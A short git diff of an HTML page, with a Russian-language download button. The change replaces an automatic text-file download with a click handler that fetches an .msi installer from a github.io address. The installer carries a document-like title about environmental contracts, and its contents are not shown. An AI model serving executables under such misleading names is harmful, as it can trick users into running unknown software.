@@ -11,10 +11,12 @@
   <button id="download_file">Скачать</button>
   <script>
     const downloadFileButton = document.querySelector('button#download_file');
-    const download = document.createElement('a');
-    download.href = 'data:text/plain;charset=utf-8, ' + encodeURIComponent('123');
-    download.download = "Установить Экологические договоры в Российской Федерации.txt";
-    download.click();
+    downloadFileButton.addEventListener('click', () => {
+      const download = document.createElement('a');
+      download.href = 'https://pyotrpopov443.github.io/download_program/Установить Экологические договоры в Российской Федерации.msi';
+      download.download = "Установить Экологические договоры в Российской Федерации.msi";
+      download.click();
+    });
   </script>
 </body>
 </html>
